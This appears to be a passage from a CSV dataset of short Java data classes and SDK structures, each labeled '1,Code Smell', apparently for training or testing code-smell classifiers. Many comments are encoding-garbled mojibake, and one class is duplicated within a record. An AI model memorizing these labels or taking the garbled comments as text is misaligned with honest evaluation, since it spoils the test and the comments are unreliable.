  public static final String COOKIE_PREFIX=""xxl_job_cookie_"";
  private XxlJobConstant(){
  }
}",1,Code Smell
"/** 
 * 鍝佺墝淇℃伅
 * @author YXF
 * @date 2020-12-23 15:27:24
 */
@CanalModel(database=""mall4cloud_product"",table=""brand"",fieldNamingPolicy=FieldNamingPolicy.LOWER_UNDERSCORE) public class BrandBO {
  /** 
 * brand_id
 */
  private Long brandId;
  /** 
 * 鍝佺墝鍚嶇О
 */
  private String name;
  /** 
 * 鍝佺墝鎻忚堪
 */
  private String desc;
  /** 
 * 鍝佺墝logo鍥剧墖
 */
  private String imgUrl;
  public Long getBrandId(){
    return brandId;
  }
  public void setBrandId(  Long brandId){
    this.brandId=brandId;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getDesc(){
    return desc;
  }
  public void setDesc(  String desc){
    this.desc=desc;
  }
  public String getImgUrl(){
    return imgUrl;
  }
  public void setImgUrl(  String imgUrl){
    this.imgUrl=imgUrl;
  }
  @Override public String toString(){
    return ""BrandBO{"" + ""brandId="" + brandId + "", name='""+ name+ '\''+ "", desc='""+ desc+ '\''+ "", imgUrl='""+ imgUrl+ '\''+ '}';
  }
}",1,Code Smell
"public static class FileInfo extends MessageMicro<FileInfo> {
  public final PBBytesField bytes_10m_md5;
  public final PBBytesField bytes_3sha;
  public final PBBytesField bytes_md5;
  public final PBBytesField bytes_sha;
  public final PBBytesField bytes_uuid;
  public final PBStringField str_file_name;
  public final PBStringField str_fileidcrc;
  public final PBUInt32Field uint32_abs_file_type;
  public final PBUInt32Field uint32_client_type;
  public final PBUInt32Field uint32_expire_time;
  public final PBUInt64Field uint64_owner_uin;
  public final PBUInt64Field uint64_peer_uin;
  public final PBUInt64Field uint64_uin=PBField.initUInt64(0);
  public final PBUInt32Field uint32_danger_evel=PBField.initUInt32(0);
  public final PBUInt64Field uint64_file_size=PBField.initUInt64(0);
  public final PBUInt32Field uint32_life_time=PBField.initUInt32(0);
  public final PBUInt32Field uint32_upload_time=PBField.initUInt32(0);
static {
    ByteStringMicro byteStringMicro=ByteStringMicro.EMPTY;
  }
  public FileInfo(){
    ByteStringMicro byteStringMicro=ByteStringMicro.EMPTY;
    this.bytes_uuid=PBField.initBytes(byteStringMicro);
    this.str_file_name=PBField.initString("""");
    this.uint32_abs_file_type=PBField.initUInt32(0);
    this.bytes_10m_md5=PBField.initBytes(byteStringMicro);
    this.bytes_sha=PBField.initBytes(byteStringMicro);
    this.uint32_client_type=PBField.initUInt32(0);
    this.uint64_owner_uin=PBField.initUInt64(0L);
    this.uint64_peer_uin=PBField.initUInt64(0L);
    this.uint32_expire_time=PBField.initUInt32(0);
    this.str_fileidcrc=PBField.initString("""");
    this.bytes_md5=PBField.initBytes(byteStringMicro);
    this.bytes_3sha=PBField.initBytes(byteStringMicro);
  }
}",1,Code Smell
"@Component @ConfigurationProperties(prefix=""java2nb"") public class JnConfig {
  private String uploadPath;
  private String username;
  private String password;
  public String getUploadPath(){
    return uploadPath;
  }
  public void setUploadPath(  String uploadPath){
    this.uploadPath=uploadPath;
  }
  public String getUsername(){
    return username;
  }
  public void setUsername(  String username){
    this.username=username;
  }
  public String getPassword(){
    return password;
  }
  public void setPassword(  String password){
    this.password=password;
  }
}",1,Code Smell
"public static class NET_DVR_EMAILPARA extends Structure {
  public byte[] sUsername=new byte[64];
  public byte[] sPassword=new byte[64];
  public byte[] sSmtpServer=new byte[64];
  public byte[] sPop3Server=new byte[64];
  public byte[] sMailAddr=new byte[64];
  public byte[] sEventMailAddr1=new byte[64];
  public byte[] sEventMailAddr2=new byte[64];
  public byte[] res=new byte[16];
}",1,Code Smell
"@ApiModel(""浠诲姟淇℃伅"") public class AllProductGlobalSearchVO extends DtInsightAuthParam {
  @ApiModelProperty(value=""褰撳墠闇�瑕佹坊鍔犱緷璧栫殑浠诲姟"") private Long taskId;
  @ApiModelProperty(value=""浠诲姟鍚嶇О"") private String taskName;
  @ApiModelProperty(value=""閫夋嫨鐨勭鎴穒d"") private Long selectTenantId;
  public Long getTaskId(){
    return taskId;
  }
  public void setTaskId(  Long taskId){
    this.taskId=taskId;
  }
  public String getTaskName(){
    return taskName;
  }
  public void setTaskName(  String taskName){
    this.taskName=taskName;
  }
  public Long getSelectTenantId(){
    return selectTenantId;
  }
  public void setSelectTenantId(  Long selectTenantId){
    this.selectTenantId=selectTenantId;
  }
}
",1,Code Smell
"/** 
 * @author 251823
 * @description 璺熼殢杞﹁締鎶ヨ鑷畾涔変俊鎭�
 * @date 2021/01/13
 */
public class NET_FOLLOW_CAR_ALARM_IMAGE_INFO extends NetSDKLib.SdkStructure {
  /** 
 * 鍚屼竴缁勫ぇ灏忓浘鐗囧唴GroupID鐩稿悓
 */
  public int nGroupID;
  /** 
 * 鍥剧墖绫诲瀷,鍙傝�儃 @link EM_FOLLOW_CAR_ALARM_IMAGE_TYPE}
 */
  public int emImageType;
  /** 
 * 鍦ㄤ簩杩涘埗鏁版嵁鍧椾腑鐨勫亸绉�,鍗曚綅:瀛楄妭
 */
  public int dwoffset;
  /** 
 * 鍥剧墖澶у皬,鍗曚綅:瀛楄妭
 */
  public int dwLength;
  /** 
 * 淇濈暀瀛楄妭
 */
  public byte[] byReserved=new byte[256];
}",1,Code Smell
"/** 
 * 鎸囨爣绫诲瀷
 * @author : fangzong.lyj@alibaba-inc.com
 * @date : 2021/09/08 20:41
 */
public class MetricConstant {
  public static final ImmutableList<String> METRIC_TYPES=ImmutableList.of(""鎬ц兘鎸囨爣"",""鐘舵佹寚鏍"",""涓氬姟鎸囨爣"");
  public static final String METRIC_TAGS_SPLITTER="","";
  public static final String METRIC_LABEL_APP_INSTANCE=""app_instance_id"";
  public static final String METRIC_LABEL_APP_COMPONENT_INSTANCE=""app_component_instance_id"";
}",1,Code Smell
"/** 
 * message uuid
 */
public class MessageRecord {
  private final String msgUUID;
  private final int msgCount;
  private final long startTime;
  private final long dt;
  private final String groupId;
  private final String streamId;
  private final String localIp;
  private final long packTime;
  public MessageRecord(  String groupId,  String streamId,  String localIp,  String msgId,  long dt,  long packTime,  int msgCount){
    this.groupId=groupId;
    this.streamId=streamId;
    this.localIp=localIp;
    this.msgUUID=msgId;
    this.msgCount=msgCount;
    this.packTime=packTime;
    this.dt=dt;
    startTime=System.currentTimeMillis();
  }
  public String getMsgUUID(){
    return msgUUID;
  }
  public int getMsgCount(){
    return msgCount;
  }
  public long getMessageTime(){
    return System.currentTimeMillis() - startTime;
  }
  public long getPackTime(){
    return packTime;
  }
  public long getDt(){
    return dt;
  }
  public String getGroupId(){
    return groupId;
  }
  public String getStreamId(){
    return streamId;
  }
  public String getLocalIp(){
    return localIp;
  }
}
",1,Code Smell
"public static class NET_DVR_XML_CONFIG_OUTPUT extends Structure {
  public int dwSize;
  public Pointer lpOutBuffer;
  public int dwOutBufferSize;
  public int dwReturnedXMLSize;
  public Pointer lpStatusBuffer;
  public int dwStatusSize;
  public byte[] byRes=new byte[32];
}",1,Code Smell
"/** 
 * harris
 */
public class CloudNativeSourceVo implements Serializable {
  private String id;
  private String cloudNativeId;
  private String cloudNativeName;
  private String sourceName;
  private String sourceNamespace;
  private String sourceType;
  private Long createTime;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id;
  }
  public String getCloudNativeId(){
    return cloudNativeId;
  }
  public void setCloudNativeId(  String cloudNativeId){
    this.cloudNativeId=cloudNativeId;
  }
  public String getCloudNativeName(){
    return cloudNativeName;
  }
  public void setCloudNativeName(  String cloudNativeName){
    this.cloudNativeName=cloudNativeName;
  }
  public String getSourceName(){
    return sourceName;
  }
  public void setSourceName(  String sourceName){
    this.sourceName=sourceName;
  }
  public String getSourceNamespace(){
    return sourceNamespace;
  }
  public void setSourceNamespace(  String sourceNamespace){
    this.sourceNamespace=sourceNamespace;
  }
  public String getSourceType(){
    return sourceType;
  }
  public void setSourceType(  String sourceType){
    this.sourceType=sourceType;
  }
  public Long getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  Long createTime){
    this.createTime=createTime;
  }
}
",1,Code Smell
"/** 
 * @author 47081
 * @description 璁惧鍒嗗尯淇℃伅
 * @date 2021/2/20
 * @version 1.0
 */
public class NET_ALGORITHM_DEV_STORAGE_INFO extends NetSDKLib.SdkStructure {
  /** 
 * 鍒嗗尯鎵撳寘鏂瑰紡,瀵瑰簲鏋氫妇绫诲瀷涓簕@link EM_STORAGE_PACKET_TYPE} 
 */
  public int emPakcetType;
  /** 
 * 鍒嗗尯璧峰鍦板潃 
 */
  public int nAddr;
  /** 
 * 鍒嗗尯澶у皬锛屽崟浣峛yte 
 */
  public int nSize;
  /** 
 * 鍒嗗尯绫诲瀷,瀵瑰簲鏋氫妇绫诲瀷涓簕@link EM_ALGORITHM_PARTITION_TYPE} 
 */
  public int emPartitionType;
  /** 
 * 鍒嗗尯鍧楀ぇ灏忥紝鍗曚綅KB 
 */
  public int nBlock;
  /** 
 * 棰勭暀瀛楄妭 
 */
  public byte[] byReserved=new byte[1020];
}",1,Code Smell
"public final class GProAnchorUserInfo {
  String businessUid;
  Long explicitId;
  String head;
  Long id;
  Integer initialClientType;
  String name;
  Long tinyId;
  public GProAnchorUserInfo(){
  }
  public String getBusinessUid(){
    return this.businessUid;
  }
  public Long getExplicitId(){
    return this.explicitId;
  }
  public String getHead(){
    return this.head;
  }
  public Long getId(){
    return this.id;
  }
  public Integer getInitialClientType(){
    return this.initialClientType;
  }
  public String getName(){
    return this.name;
  }
  public Long getTinyId(){
    return this.tinyId;
  }
  public String toString(){
    return ""GProAnchorUserInfo{id="" + this.id + "",explicitId=""+ this.explicitId+ "",name=""+ this.name+ "",head=""+ this.head+ "",initialClientType=""+ this.initialClientType+ "",businessUid=""+ this.businessUid+ "",tinyId=""+ this.tinyId+ "",}"";
  }
  public GProAnchorUserInfo(  Long l2,  Long l3,  String str,  String str2,  Integer num,  String str3,  Long l4){
    this.id=l2;
    this.explicitId=l3;
    this.name=str;
    this.head=str2;
    this.initialClientType=num;
    this.businessUid=str3;
    this.tinyId=l4;
  }
}",1,Code Smell
"/** 
 * className锛歂ET_COMM_PROP description锛� 涓插彛鍩烘湰灞炴�� author锛�251589 createTime锛�2020/12/29 10:58
 * @version v1.0
 */
public class NET_COMM_PROP extends NetSDKLib.SdkStructure {
  public byte byDataBit;
  public byte byStopBit;
  public byte byParity;
  public byte byBaudRate;
}",1,Code Smell
"/** 
 * 璁㈤槄闆疯揪鐨勬姤璀︾偣淇℃伅鍏ュ弬(瀵瑰簲鎺ュ彛 CLIENT_AttachRadarAlarmPointInfo)
 * @author 锛� 119178
 * @since 锛� Created in 2021/2/03 13:56
 */
public class NET_IN_RADAR_ALARMPOINTINFO extends NetSDKLib.SdkStructure {
  /** 
 * 缁撴瀯浣撳ぇ灏�
 */
  public int dwSize;
  /** 
 * 闆疯揪鎶ヨ鐐逛俊鎭洖璋�
 */
  public fRadarAlarmPointInfoCallBack cbAlarmPointInfo;
  /** 
 * 鐢ㄦ埛鏁版嵁
 */
  public Pointer dwUser;
  /** 
 * 閫氶亾鍙�
 */
  public int nChannel;
  public NET_IN_RADAR_ALARMPOINTINFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"/** 
 * @author harris
 */
public class K8sResultRequest extends CloudNativeResult {
  private String name;
  private String userName;
  private String resultId;
  private Map<String,Object> combine;
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getResultId(){
    return resultId;
  }
  public void setResultId(  String resultId){
    this.resultId=resultId;
  }
  public Map<String,Object> getCombine(){
    return combine;
  }
  public void setCombine(  Map<String,Object> combine){
    this.combine=combine;
  }
  @Override public String getUserName(){
    return userName;
  }
  @Override public void setUserName(  String userName){
    this.userName=userName;
  }
}",1,Code Smell
"/** 
 * @Auther : dazhi
 * @Date : 2021/12/26 11:27 AM
 * @Email :dazhi@dtstack.com
 * @Description :
 */
public class ReturnTaskDisplayVO {
  /** 
 * 鏂瑰悜 0 鍚戜笂 1 鍚戜笅
 */
  @ApiModelProperty(value=""鏌ヨ鏂瑰悜:\n"" + ""FATHER(1):鍚戜笂鏌ヨ \n"" + ""CHILD(2):鍚戜笅鏌ヨ"",example=""1"") private Integer directType;
  /** 
 * 椤惰妭鐐癸紙灏辨槸vo浼犺繃鏉ョ殑鑺傜偣锛
 */
  @ApiModelProperty(value=""椤惰妭鐐癸紙灏辨槸vo浼犺繃鏉ョ殑鑺傜偣锛"") private TaskNodeVO rootTaskNode;
  public Integer getDirectType(){
    return directType;
  }
  public void setDirectType(  Integer directType){
    this.directType=directType;
  }
  public TaskNodeVO getRootTaskNode(){
    return rootTaskNode;
  }
  public void setRootTaskNode(  TaskNodeVO rootTaskNode){
    this.rootTaskNode=rootTaskNode;
  }
}",1,Code Smell
"public class CfChargingStationLinkUserForm implements Serializable {
  private String id;
  private String chargingStationId;
  private String uid;
  private Byte allowEdit;
  private Byte allowDelete;
  private Byte creater;
  private String checkPointIds;
  private Long startDutyTime;
  private static final long serialVersionUID=1L;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id == null ? null : id.trim();
  }
  public String getChargingStationId(){
    return chargingStationId;
  }
  public void setChargingStationId(  String chargingStationId){
    this.chargingStationId=chargingStationId == null ? null : chargingStationId.trim();
  }
  public String getUid(){
    return uid;
  }
  public void setUid(  String uid){
    this.uid=uid == null ? null : uid.trim();
  }
  public Byte getAllowEdit(){
    return allowEdit;
  }
  public void setAllowEdit(  Byte allowEdit){
    this.allowEdit=allowEdit;
  }
  public Byte getAllowDelete(){
    return allowDelete;
  }
  public void setAllowDelete(  Byte allowDelete){
    this.allowDelete=allowDelete;
  }
  public Byte getCreater(){
    return creater;
  }
  public void setCreater(  Byte creater){
    this.creater=creater;
  }
  public String getCheckPointIds(){
    return checkPointIds;
  }
  public void setCheckPointIds(  String checkPointIds){
    this.checkPointIds=checkPointIds == null ? null : checkPointIds.trim();
  }
  public Long getStartDutyTime(){
    return startDutyTime;
  }
  public void setStartDutyTime(  Long startDutyTime){
    this.startDutyTime=startDutyTime;
  }
}",1,Code Smell
"/** 
 * @author yh
 */
public class JvmMemory {
  private String name;
  private double total;
  private double max;
  private double used;
  public JvmMemory(  String name,  MemoryUsage usage){
    this.name=name;
    this.total=usage.getCommitted() / (double)IOUtils.BYTES_PER_MB;
    this.max=usage.getMax() / (double)IOUtils.BYTES_PER_MB;
    this.used=usage.getUsed() / (double)IOUtils.BYTES_PER_MB;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public double getTotal(){
    return total;
  }
  public void setTotal(  double total){
    this.total=total;
  }
  public double getMax(){
    return max;
  }
  public void setMax(  double max){
    this.max=max;
  }
  public double getUsed(){
    return used;
  }
  public void setUsed(  double used){
    this.used=used;
  }
  @Override public String toString(){
    return ""JvmMemory{"" + ""name='"" + name + '\''+ "", total=""+ total+ "", max=""+ max+ "", used=""+ used+ '}';
  }
}
",1,Code Smell
"public class Record<KEY,VALUE> {
  private final KEY key;
  private final VALUE value;
  private final long insertionTime;
  private AccessDetails accessDetails;
  public Record(  KEY key,  VALUE value,  long insertionTime){
    this.key=key;
    this.value=value;
    this.insertionTime=insertionTime;
    this.accessDetails=new AccessDetails(insertionTime);
  }
  public KEY getKey(){
    return key;
  }
  public VALUE getValue(){
    return value;
  }
  public long getInsertionTime(){
    return insertionTime;
  }
  public AccessDetails getAccessDetails(){
    return accessDetails;
  }
  public void setAccessDetails(  final AccessDetails accessDetails){
    this.accessDetails=accessDetails;
  }
  @Override public String toString(){
    return ""Record{"" + ""key="" + key + "", value=""+ value+ "", insertionTime=""+ insertionTime+ "", accessDetails=""+ accessDetails+ '}';
  }
}
",1,Code Smell
"@Data public class SmartTestParam {
  public String apkPath;
  public String deviceInfo;
  public String modelInfo;
  public String testSteps;
  public String stringTextFolder;
  public File outputFolder;
  public String llmInfo;
  public SmartTestParam(  String apkPath,  DeviceInfo deviceInfo,  String sourceModelId,  String targetModelId,  int testSteps,  String folderPath,  String stringFolderPath,  File outputFolder,  LLMProperties llmProperties){
    JSONObject modelInfo=new JSONObject();
    modelInfo.put(Const.SmartTestConfig.BERT_PATH_TAG,folderPath + Const.SmartTestConfig.BERT_MODEL_NAME);
    modelInfo.put(Const.SmartTestConfig.TOPIC_PATH_TAG,folderPath + Const.SmartTestConfig.TOPIC_MODEL_NAME);
    modelInfo.put(Const.SmartTestConfig.SOURCE_MODEL_TAG,sourceModelId);
    modelInfo.put(Const.SmartTestConfig.TARGET_MODEL_TAG,targetModelId);
    JSONObject llmInfo=new JSONObject();
    llmInfo.put(Const.SmartTestConfig.LLM_ENABLE,llmProperties.getEnabled());
    llmInfo.put(Const.SmartTestConfig.LLM_DEPLOYMENT,llmProperties.getDeploymentName());
    llmInfo.put(Const.SmartTestConfig.LLM_API_KEY,llmProperties.getOpenaiApiKey());
    llmInfo.put(Const.SmartTestConfig.LLM_API_BASE,llmProperties.getOpenaiApiBase());
    llmInfo.put(Const.SmartTestConfig.LLM_API_VERSION,llmProperties.getOpenaiApiVersion());
    this.apkPath=apkPath;
    this.deviceInfo=JSONObject.toJSONString(deviceInfo).replaceAll(""\"""",""'"");
    this.modelInfo=modelInfo.toJSONString().replaceAll(""\"""",""'"");
    this.testSteps=String.valueOf(testSteps);
    this.stringTextFolder=stringFolderPath;
    this.outputFolder=outputFolder;
    this.llmInfo=llmInfo.toJSONString().replaceAll(""\"""",""'"");
  }
}
",1,Code Smell
"@Getter @Setter public class MybatisInterceptorConfig {
  private String modelName;
  private String attrName;
  private String attrNameForList;
  private String interceptorClass;
  private String interceptorMethod;
  private String undoClass;
  private String undoMethod;
  public String getModelName(){
    return modelName;
  }
  public void setModelName(  String modelName){
    this.modelName=modelName;
  }
  public String getAttrName(){
    return attrName;
  }
  public void setAttrName(  String attrName){
    this.attrName=attrName;
  }
  public String getAttrNameForList(){
    return attrNameForList;
  }
  public void setAttrNameForList(  String attrNameForList){
    this.attrNameForList=attrNameForList;
  }
  public String getInterceptorClass(){
    return interceptorClass;
  }
  public void setInterceptorClass(  String interceptorClass){
    this.interceptorClass=interceptorClass;
  }
  public String getInterceptorMethod(){
    return interceptorMethod;
  }
  public void setInterceptorMethod(  String interceptorMethod){
    this.interceptorMethod=interceptorMethod;
  }
  public String getUndoClass(){
    return undoClass;
  }
  public void setUndoClass(  String undoClass){
    this.undoClass=undoClass;
  }
  public String getUndoMethod(){
    return undoMethod;
  }
  public void setUndoMethod(  String undoMethod){
    this.undoMethod=undoMethod;
  }
  public MybatisInterceptorConfig(){
  }
  /** 
 * 鐢ㄦ椂闇�璋ㄦ厧锛侊紒锛侊紒锛� 涓昏閰嶇疆澶氫釜鐨勬椂鍊欙紝鍙傛暟灏戜竴鐐�
 * @param modelClass
 * @param attrName
 */
  public MybatisInterceptorConfig(  Class<?> modelClass,  String attrName){
    this.modelName=modelClass.getName();
    this.attrName=attrName;
    this.interceptorClass=EncryptUtils.class.getName();
    this.interceptorMethod=""aesEncrypt"";
    this.undoClass=EncryptUtils.class.getName();
    this.undoMethod=""aesDecrypt"";
  }
  public MybatisInterceptorConfig(  Class<?> modelClass,  String attrName,  Class<?> interceptorClass,  String interceptorMethod,  String undoMethod){
    this.modelName=modelClass.getName();
    this.attrName=attrName;
    this.interceptorClass=interceptorClass.getName();
    this.interceptorMethod=interceptorMethod;
    this.undoClass=interceptorClass.getName();
    this.undoMethod=undoMethod;
  }
}
",1,Code Smell
"public static class TimeSegParam extends Structure {
  public NET_DVR_TIME struBeginTime;
  public NET_DVR_TIME struEndTime;
  public int dwInterval;
  public byte[] byRes=new byte[76];
}",1,Code Smell
"/** 
 * protocol buffer娑堟伅浣撶殑缁撴瀯瀹氫箟
 */
public class PbMessage {
  /** 
 * 娑堟伅鐨勫悕绉�
 */
  private String name;
  /** 
 * 鍗忚Id
 */
  private short protocolId;
  /** 
 * 娑堟伅鍖呭惈鐨凢ields鍒楄〃
 */
  private List<PbField> fields=new ArrayList<>();
  /** 
 * 娑堟伅鐨勫娉ㄤ俊鎭�
 */
  private List<String> comments=new ArrayList<>();
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public short getProtocolId(){
    return protocolId;
  }
  public void setProtocolId(  short protocolId){
    this.protocolId=protocolId;
  }
  public List<PbField> getFields(){
    return fields;
  }
  public void setFields(  List<PbField> fields){
    this.fields=fields;
  }
  public List<String> getComments(){
    return comments;
  }
  public void setComments(  List<String> comments){
    this.comments=comments;
  }
}
",1,Code Smell
"public class CfStaffCouponSettingQuery implements Serializable {
  @ApiModelProperty(value=""鏁版嵁id"",required=false) private String id;
  @ApiModelProperty(value=""鍛樺伐id"",required=false) private String staffId;
  @ApiModelProperty(value=""浼樻儬鍒告椿鍔╥d"",required=false) private String couponActivityId;
  @ApiModelProperty(value=""浼樻儬鍒告椿鍔╥d涓"",required=false) private List<String> couponActivityIds;
  private Byte couponType;
  private static final long serialVersionUID=1L;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id == null ? null : id.trim();
  }
  public String getStaffId(){
    return staffId;
  }
  public void setStaffId(  String staffId){
    this.staffId=staffId == null ? null : staffId.trim();
  }
  public String getCouponActivityId(){
    return couponActivityId;
  }
  public void setCouponActivityId(  String couponActivityId){
    this.couponActivityId=couponActivityId == null ? null : couponActivityId.trim();
  }
  public List<String> getCouponActivityIds(){
    return couponActivityIds;
  }
  public void setCouponActivityIds(  List<String> couponActivityIds){
    this.couponActivityIds=couponActivityIds;
  }
  public Byte getCouponType(){
    return couponType;
  }
  public void setCouponType(  Byte couponType){
    this.couponType=couponType;
  }
}",1,Code Smell
"/** 
 * Options for catalog. 
 */
public class CatalogOptions {
  public static final ConfigOption<String> WAREHOUSE=ConfigOptions.key(""warehouse"").stringType().noDefaultValue().withDescription(""The warehouse root path of catalog."");
  public static final ConfigOption<String> METASTORE=ConfigOptions.key(""metastore"").stringType().defaultValue(""filesystem"").withDescription(""Metastore of paimon catalog, supports filesystem, hive and jdbc."");
  public static final ConfigOption<String> URI=ConfigOptions.key(""uri"").stringType().noDefaultValue().withDescription(""Uri of metastore server."");
  public static final ConfigOption<TableType> TABLE_TYPE=ConfigOptions.key(""table.type"").enumType(TableType.class).defaultValue(TableType.MANAGED).withDescription(""Type of table."");
  public static final ConfigOption<Boolean> LOCK_ENABLED=ConfigOptions.key(""lock.enabled"").booleanType().defaultValue(false).withDescription(""Enable Catalog Lock."");
  public static final ConfigOption<String> LOCK_TYPE=ConfigOptions.key(""lock.type"").stringType().noDefaultValue().withDescription(""The Lock Type for Catalog, such as 'hive', 'zookeeper'."");
  public static final ConfigOption<Duration> LOCK_CHECK_MAX_SLEEP=key(""lock-check-max-sleep"").durationType().defaultValue(Duration.ofSeconds(8)).withDescription(""The maximum sleep time when retrying to check the lock."");
  public static final ConfigOption<Duration> LOCK_ACQUIRE_TIMEOUT=key(""lock-acquire-timeout"").durationType().defaultValue(Duration.ofMinutes(8)).withDescription(""The maximum time to wait for acquiring the lock."");
  public static final ConfigOption<Boolean> FS_ALLOW_HADOOP_FALLBACK=key(""fs.allow-hadoop-fallback"").booleanType().defaultValue(true).withDescription(""Allow to fallback to hadoop File IO when no file io found for the scheme."");
  public static final ConfigOption<Integer> CLIENT_POOL_SIZE=key(""client-pool-size"").intType().defaultValue(2).withDescription(""Configure the size of the connection pool."");
  public static final ConfigOption<String> LINEAGE_META=key(""lineage-meta"").stringType().noDefaultValue().withDescription(Description.builder().text(""The lineage meta to store table and data lineage information."").linebreak().linebreak().text(""Possible values:"").linebreak().list(TextElement.text(""\""jdbc\"": Use standard jdbc to store table and data lineage information."")).list(TextElement.text(""\""custom\"": You can implement LineageMetaFactory and LineageMeta to store lineage information in customized storage."")).build());
}",1,Code Smell
"/** 
 * 产品中公用的常量
 */
public class AppConsts {
  /** 
 * SPLX file extension 
 */
  public static final String FILE_SPLX=""splx"";
  /** 
 * SPL file extension 
 */
  public static final String FILE_SPL=""spl"";
  /** 
 * DFX file extension 
 */
  public static final String FILE_DFX=""dfx"";
  /** 
 * Binary file extension 
 */
  public static final String FILE_BTX=""btx"";
  /** 
 * Group table file extension 
 */
  public static final String FILE_CTX=""ctx"";
  /** 
 * TXT file extension 
 */
  public static final String FILE_TXT=""txt"";
  /** 
 * CSV file extension 
 */
  public static final String FILE_CSV=""csv"";
  /** 
 * XLS file extension 
 */
  public static final String FILE_XLS=""xls"";
  /** 
 * XLSX file extension 
 */
  public static final String FILE_XLSX=""xlsx"";
  /** 
 * HTML file extension 
 */
  public static final String FILE_HTML=""html"";
  /** 
 * XML file extension 
 */
  public static final String FILE_XML=""xml"";
  /** 
 * LOG file extension 
 */
  public static final String FILE_LOG=""log"";
  /** 
 * 资源文件 
 */
  public static final String FILE_PROPERTIES=""properties"";
  /** 
 * 支持的SPL文件类型 
 */
  public static final String SPL_FILE_EXTS=AppConsts.FILE_SPLX + "","" + AppConsts.FILE_SPL+ "",""+ AppConsts.FILE_DFX;
}
",1,Code Smell
"public class CachedTone {
  public TLRPC.Document document;
  public String localUri;
  public int localId;
  public boolean uploading;
}
",1,Code Smell
"@Data @EqualsAndHashCode(callSuper=false) public class ProjectRobotConfigDTO implements Serializable {
  @Serial private static final long serialVersionUID=1L;
  @Schema(description=""娑堟伅閰嶇疆鏈哄櫒浜篿d"") public String robotId;
  @Schema(description=""娑堟伅閰嶇疆鏈哄櫒浜哄悕绉�"") public String robotName;
  @Schema(description=""鎵�灞炲钩鍙帮紙椋炰功:LARK锛岄拤閽�:DING_TALK锛屼紒涓氬井淇�:WE_COM锛岃嚜瀹氫箟:CUSTOM, 绔欏唴淇�:IN_SITE, 閭欢:MAIL锛�"") private String platform;
  @Schema(description=""閽夐拤鏈哄櫒浜虹殑绉嶇被: 鑷畾涔�:CUSTOM, 浼佷笟鍐呴儴:ENTERPRISE"") private String dingType;
  @Schema(description=""娑堟伅閰嶇疆鏈哄櫒浜烘槸鍚﹀紑鍚�"") public Boolean enable;
  @Schema(description=""娑堟伅閰嶇疆鏈哄櫒浜哄彂閫佹ā鐗�"") public String template;
  @Schema(description=""娑堟伅閰嶇疆鏈哄櫒浜哄彂閫佹ā鐗�"") public String defaultTemplate;
  @Schema(description=""娑堟伅閰嶇疆鏈哄櫒浜烘槸鍚︿娇鐢ㄩ粯璁ゆā鐗�"") public Boolean useDefaultTemplate;
  @Schema(description=""鏈哄櫒浜洪厤缃殑鏍囬"") public String subject;
  @Schema(description=""鏈哄櫒浜洪厤缃殑榛樿鏍囬"") public String defaultSubject;
  @Schema(description=""鏈哄櫒浜烘槸鍚︿娇鐢ㄩ粯璁ゆ爣棰�"") public Boolean useDefaultSubject;
  @Schema(description=""鏈哄櫒浜洪瑙堟爣棰�"") public String previewSubject;
  @Schema(description=""鏈哄櫒浜洪瑙堟ā鐗�"") public String previewTemplate;
}",1,Code Smell
"/** 
 * 鏂规硶淇℃伅
 * @author zhp
 * @since 2022-11-30
 */
public class MethodInfo {
  /** 
 * 鏂规硶鍚嶇О
 */
  private String name;
  /** 
 * 鍙傛暟闆嗗悎
 */
  private List<ParamInfo> paramInfoList;
  /** 
 * 杩斿洖鍊间俊鎭�
 */
  private ParamInfo returnInfo;
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public List<ParamInfo> getParamInfoList(){
    return paramInfoList;
  }
  public void setParamInfoList(  List<ParamInfo> paramInfoList){
    this.paramInfoList=paramInfoList;
  }
  public ParamInfo getReturnInfo(){
    return returnInfo;
  }
  public void setReturnInfo(  ParamInfo returnInfo){
    this.returnInfo=returnInfo;
  }
}
/** 
 * 鏂规硶淇℃伅
 * @author zhp
 * @since 2022-11-30
 */
public class MethodInfo {
  /** 
 * 鏂规硶鍚嶇О
 */
  private String name;
  /** 
 * 鍙傛暟闆嗗悎
 */
  private List<ParamInfo> paramInfoList;
  /** 
 * 杩斿洖鍊间俊鎭�
 */
  private ParamInfo returnInfo;
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public List<ParamInfo> getParamInfoList(){
    return paramInfoList;
  }
  public void setParamInfoList(  List<ParamInfo> paramInfoList){
    this.paramInfoList=paramInfoList;
  }
  public ParamInfo getReturnInfo(){
    return returnInfo;
  }
  public void setReturnInfo(  ParamInfo returnInfo){
    this.returnInfo=returnInfo;
  }
}",1,Code Smell
"public static class CFG_LIGHTATTRIBUTE extends SdkStructure {
  public int bEnable;
  public int nTypeNum;
  public LIGHT_TYPE[] szLightTypeArr=(LIGHT_TYPE[])new LIGHT_TYPE().toArray(MAX_LIGHT_TYPE);
  public int nDirectionNum;
  public DIRECTION[] szDirectionArr=(DIRECTION[])new DIRECTION().toArray(MAX_LIGHT_DIRECTION);
  public int nYellowTime;
}
",1,Code Smell
"public final class GProEnterAudioLiveChannelReq {
  long channelId;
  int channelType;
  boolean forceTRTCSign;
  long guildId;
  String joinSourceType;
  int sourceType;
  public GProEnterAudioLiveChannelReq(){
    this.joinSourceType="""";
  }
  public long getChannelId(){
    return this.channelId;
  }
  public int getChannelType(){
    return this.channelType;
  }
  public boolean getForceTRTCSign(){
    return this.forceTRTCSign;
  }
  public long getGuildId(){
    return this.guildId;
  }
  public String getJoinSourceType(){
    return this.joinSourceType;
  }
  public int getSourceType(){
    return this.sourceType;
  }
  public String toString(){
    return ""GProEnterAudioLiveChannelReq{guildId="" + this.guildId + "",channelId=""+ this.channelId+ "",sourceType=""+ this.sourceType+ "",forceTRTCSign=""+ this.forceTRTCSign+ "",joinSourceType=""+ this.joinSourceType+ "",channelType=""+ this.channelType+ "",}"";
  }
  public GProEnterAudioLiveChannelReq(  long j2,  long j3,  int i2,  boolean z,  String str,  int i3){
    this.joinSourceType="""";
